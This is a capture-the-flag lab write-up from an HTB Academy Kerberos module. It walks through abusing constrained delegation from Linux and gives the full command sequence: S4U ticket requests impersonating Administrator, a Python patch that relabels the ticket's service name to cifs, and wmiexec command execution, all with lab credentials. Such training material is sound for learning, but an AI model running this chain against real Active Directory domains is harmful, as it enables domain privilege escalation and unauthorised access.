# Constrained Delegation from Linux

**Module:** HTB Academy — Kerberos Attacks
**Target:** `ACADEMY-KERBATTCK-2-DC01` (10.129.54.110), domain `INLANEFREIGHT.LOCAL`
**Given access:** `beth.richards` / `B3thR!ch@rd$`
**Goal:** read `C:\Users\Administrator\Desktop\flag.txt`

**Result:** `Fl4g_C0nstrained_Delg` — Administrator file access on DC01, entirely from Linux with impacket (no Windows GUI, no Rubeus).

---

## 1. Attack chain (summary)

1. Confirm creds and enumerate `beth.richards`'s delegation rights via LDAP: `msDS-AllowedToDelegateTo: TERMSRV/DC01.INLANEFREIGHT.LOCAL, TERMSRV/DC01` (constrained delegation, no protocol transition flag needed beyond what's already set — she also carries her own SPN `HTTP/DC01`, which is what lets her legally perform S4U2Self at all).
2. `impacket-getST` (S4U2Self + S4U2Proxy) impersonating `Administrator`, requesting a ticket for the **only allowed SPN**, `TERMSRV/DC01.INLANEFREIGHT.LOCAL`.
3. Constrained delegation only binds the ticket to the target **host**, not the **service class** — classic "sname substitution": patch the saved `.ccache`'s service name from `TERMSRV` to `cifs` so the exact same forged ticket is usable for file/DCOM access instead of just RDP.
4. `wmiexec.py -k` with the patched ticket → command execution as Administrator → read the flag.

---

## 2. Where I got stuck (and the actual fixes)

### 2.1 `getST.py` failing to even start: stale `KRB5CCNAME`

```
[Errno 2] No such file or directory: '/tmp/beth.ccache'
```
I'd pre-set `KRB5CCNAME` to a path that didn't exist yet, expecting `getST.py` to create it there. It doesn't — it tries to **read** `KRB5CCNAME` first (to see if a usable TGT is already cached) and chokes on a path that doesn't exist. Fix: leave `KRB5CCNAME` unset for the `getST.py` call itself; it authenticates with the given password and writes its own output file (`Administrator@TERMSRV_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache`) in the current directory regardless.

### 2.2 The forged ticket is for `TERMSRV`, but we want file access, not RDP

`msDS-AllowedToDelegateTo` only lists `TERMSRV/DC01...` — in theory that only lets `beth.richards` delegate to the **Terminal Services** class on DC01 (i.e., get someone an RDP session as Administrator). We don't want an RDP session; we want to read a file. The service ticket's `sname` (service principal name) field is **not cryptographically bound** to the service class in a way the target actually re-validates against delegation policy — the KDC enforces the allow-list only at ticket-*issuance* time; the file/DCOM service on the other end just checks "can I decrypt this with my long-term key, and is the PAC/cname valid" (both unaffected by the sname string). So the ticket can be relabelled after the fact.

`getST.py` itself has no `--altservice` flag (unlike `Rubeus.exe s4u`), so I patched the ccache by hand:

```python
from impacket.krb5.ccache import CCache
ccache = CCache.loadFile("Administrator@TERMSRV_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache")
comp = ccache.credentials[0]["server"].components[0]
comp['data'] = b'cifs'
```

**First attempt silently produced a corrupt ccache.** I only overwrote `components[0]['data']` (the bytes `b'TERMSRV'` → `b'cifs'`), forgetting that `CountedOctetString` (impacket's wire-format struct for this field) stores its own explicit `length` prefix separately from `data`:
```python
class CountedOctetString(Structure):
    structure = (('length','!L=0'), ('_data','_-data','self["length"]'), ('data',':'))
```
Saving with the old `length` (7, for `"TERMSRV"`) but new 4-byte data desynced every subsequent field in the binary ccache, and using it later failed deep inside impacket's Kerberos key-unpacking with a confusing, unrelated-looking error:
```
[-] ('unpack requires a buffer of 2 bytes', "When unpacking field 'keytype | !H=0 | b''[:2]'", ...)
```
Fix: also set `comp['length'] = len(b'cifs')` before `ccache.saveFile(...)`. Reloading and `prettyPrint()`-ing the result afterward confirmed the fix immediately (`cifs/DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL`) — worth doing that sanity check every time you hand-edit a binary credential cache, since a silently-corrupt file fails far away from the actual bug.

### 2.3 `wmiexec.py`'s interactive shell mode hanging / timing out

```bash
echo 'type C:\Users\Administrator\Desktop\flag.txt
exit' | wmiexec.py -k -no-pass ... 2>&1
```
This opens `wmiexec`'s semi-interactive `C:\>` shell and waits for a command *after* the DCOM session is already up — piping input via `echo | ...` races the shell's own startup banner and the command got swallowed; the whole thing just sat there until the sandbox's 120s foreground timeout kicked it to background. Fix: skip the interactive shell entirely and pass the command as a positional argument, which runs it non-interactively and exits on its own:
```bash
wmiexec.py -k -no-pass 'INLANEFREIGHT.LOCAL/Administrator@DC01.INLANEFREIGHT.LOCAL' \
    -target-ip 10.129.54.110 "type C:\Users\Administrator\Desktop\flag.txt"
```

### 2.4 `-target-ip` is mandatory here too

Same lesson as in the Unconstrained Delegation module: the Kerberos principal name (`DC01.INLANEFREIGHT.LOCAL`) needs to resolve for ticket validation, but this box's DNS isn't the one configured as this machine's resolver. `-target-ip 10.129.54.110` keeps the SPN/realm intact for Kerberos while pointing the actual TCP connection at the right address.

---

## 3. Full command sequence (as actually run)

```bash
# 1. Confirm creds
nxc smb 10.129.54.110 -u beth.richards -p 'B3thR!ch@rd$'

# 2. Enumerate delegation rights (plain ldap3, no extra tooling)
python3 -c "
from ldap3 import Server, Connection, NTLM, ALL
s = Server('10.129.54.110', get_info=ALL)
c = Connection(s, user='INLANEFREIGHT\\\\beth.richards', password='B3thR!ch@rd\$',
               authentication=NTLM, auto_bind=True)
c.search('DC=INLANEFREIGHT,DC=LOCAL', '(sAMAccountName=beth.richards)',
          attributes=['msDS-AllowedToDelegateTo','servicePrincipalName'])
print(c.entries)
"
# msDS-AllowedToDelegateTo: TERMSRV/DC01.INLANEFREIGHT.LOCAL, TERMSRV/DC01

# 3. S4U2Self + S4U2Proxy impersonating Administrator
unset KRB5CCNAME
getST.py -spn 'TERMSRV/DC01.INLANEFREIGHT.LOCAL' -impersonate Administrator \
    -dc-ip 10.129.54.110 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$'
# -> Administrator@TERMSRV_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache

# 4. Patch the service name (sname substitution: TERMSRV -> cifs)
python3 -c "
from impacket.krb5.ccache import CCache
ccache = CCache.loadFile('Administrator@TERMSRV_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache')
comp = ccache.credentials[0]['server'].components[0]
comp['data'] = b'cifs'
comp['length'] = len(b'cifs')
ccache.saveFile('Administrator_cifs.ccache')
"

# 5. Use the forged cifs ticket for command execution
export KRB5CCNAME="$(pwd)/Administrator_cifs.ccache"
wmiexec.py -k -no-pass 'INLANEFREIGHT.LOCAL/Administrator@DC01.INLANEFREIGHT.LOCAL' \
    -target-ip 10.129.54.110 "type C:\Users\Administrator\Desktop\flag.txt"
# Fl4g_C0nstrained_Delg
```

---

## 4. Flag

**`Fl4g_C0nstrained_Delg`**

---

## 5. Key takeaways

- **Constrained delegation's allow-list restricts the target host, not the service class actually usable on it.** A single `TERMSRV/<host>` entry is enough to forge a ticket for CIFS/LDAP/HOST/etc. on that same host — patch the `sname` in the ccache (or use `Rubeus.exe s4u /altservice:...` on Windows) rather than assuming the listed SPN limits you to that literal service.
- **Binary credential formats have redundant length fields.** Editing one without the other produces a ccache that *loads* fine but fails downstream in a way that looks unrelated to the edit. Always round-trip (`loadFile` → modify → `saveFile` → reload → `prettyPrint()`) to confirm a hand-patched binary artifact before trusting it.
- `impacket-wmiexec`'s interactive mode and its "pass a command as an argument" mode behave very differently under automation — prefer the latter for anything scripted.
- `-target-ip` is needed whenever the attacking host's configured DNS resolver isn't the target domain's own DNS server, independent of which Kerberos/impacket tool is in use.
